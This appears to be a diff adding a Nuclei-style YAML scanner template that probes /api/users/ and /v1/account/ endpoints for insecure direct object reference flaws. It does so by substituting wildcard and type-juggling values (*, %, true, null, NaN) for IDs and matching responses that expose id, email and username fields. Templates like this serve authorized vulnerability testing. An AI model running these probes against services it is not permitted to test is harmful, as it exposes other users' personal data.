@@ -1,0 +1,44 @@
+id: idor-type-juggling
+info:
+  name: IDOR via Type Juggling / Wildcards
+  author: WhiteFatalis
+  severity: high
+  description: Attempts to bypass ID checks using special characters, booleans, or wildcards which might be interpreted as 'all' or 'true' by the backend.
+  tags: idor, logic, fuzz
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/{{payload}}"
+      - "{{BaseURL}}/v1/account/{{payload}}"
+
+    payloads:
+      payload:
+        - "*"
+        - "%"
+        - "true"
+        - "undefined"
+        - "null"
+        - "NaN"
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "\"id\":"
+          - "email"
+          - "username"
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - "error"
+          - "not found"
+        negative: true
